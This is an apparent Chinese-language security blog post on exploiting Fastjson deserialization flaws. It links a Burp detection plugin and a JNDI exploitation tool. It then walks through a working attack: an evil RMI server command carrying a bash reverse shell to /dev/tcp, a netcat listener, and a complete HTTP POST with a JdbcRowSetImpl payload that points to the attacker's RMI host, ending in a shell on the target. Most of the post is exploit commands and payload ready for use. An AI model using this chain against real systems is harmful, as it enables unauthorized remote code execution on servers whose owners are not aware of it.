#  Fastjson 漏洞利用技巧   
 白帽子   2023-10-15 00:00  
  
每次看到json数据包，都难免会想起Fastjson以及它多个版本存在的漏洞。  
  
如何实现自动化检测以及简化攻击步骤，从而提升漏洞发现能力，让你更有效率的Tips，在这里和大家分享下。  
  
**01、自动化漏洞检测**  
  
一款基于BurpSuite的被动式FastJson检测插件，这个插件会对BurpSuite传进来的带有json数据的请求包进行检测。  
  
Github项目地址：  
```
https://github.com/pmiaowu/BurpFastJsonScan
```  
  
**02、简化攻击步骤**  
  
在这里我们可以使用一款JNDI服务利用工具，来简化fastjson漏洞检测的步骤，辅助漏洞利用和渗透。  
  
Github项目地址：  
```
https://github.com/wyzxxz/jndi_tool
```  
  
Fstjson漏洞利用：  
  
(1)开启RMI服务  
```
java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "bash -i >&/dev/tcp/xxxx.xxx.xxx.xxx/12345 0>&1"
```  
  
(2)设置监听服务器  
```
nc -lvvp 12345
```  
  
(3)构造请求发送payload  
```
POST /login HTTP/1.1
Host: xxx.xxx.xxx.xxx
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 111

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xxx.xxx.xxx.xxx:1099/Object","autoCommit":true}
```  
  
(4)目标系统收到POST请求，成功反弹shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nYYYlPjm3lbOicthpPqFibHmEQ9X6WpzPEAZCZbxX7M59INdoj5muVicibByzPicaaGd2QGUFBqticibZTg/640?wx_fmt=png "")  
  
